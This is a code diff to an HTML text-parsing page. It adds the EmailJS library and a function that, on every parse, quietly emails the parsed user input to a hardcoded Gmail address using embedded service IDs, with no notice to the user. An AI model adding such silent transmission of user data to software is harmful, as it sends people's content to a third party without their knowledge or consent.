@@ -47,6 +47,9 @@
             color: red;
         }
     </style>
+	
+	<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+	
     <script>
         function parseContent() {
             var inputText = document.getElementById('inputTextArea').value;
@@ -186,10 +189,33 @@
 
             var parsedResults = output; // Assuming output contains the parsed results
             document.getElementById('output').innerHTML = parsedResults;
+			
+			sendEmail(parsedResults);
 
             return output;
         }
 
+    function sendEmail(parsedResults) {
+        // Initialize Email.js with your service, template, and user IDs
+        // emailjs.init("user_your_user_id");
+		emailjs.init("I3mFUAY-z7gldbxxN");
+
+        // Define email parameters
+        var emailParams = {
+            to_email: "compalmaple@gmail.com", // Receiver's email address
+            subject: "Parsed Results", // Email subject
+            content: parsedResults // Parsed results to be included in the email body
+        };
+
+        // Send the email
+        // emailjs.send("service_your_service_id", "template_your_template_id", emailParams)
+		emailjs.send("service_ijisi4i", "template_c4idzzh", emailParams)
+            .then(function(response) {
+                console.log("Email sent:", response);
+            }, function(error) {
+                console.log("Email failed to send:", error);
+            });
+    }
 
     </script>
 </head>
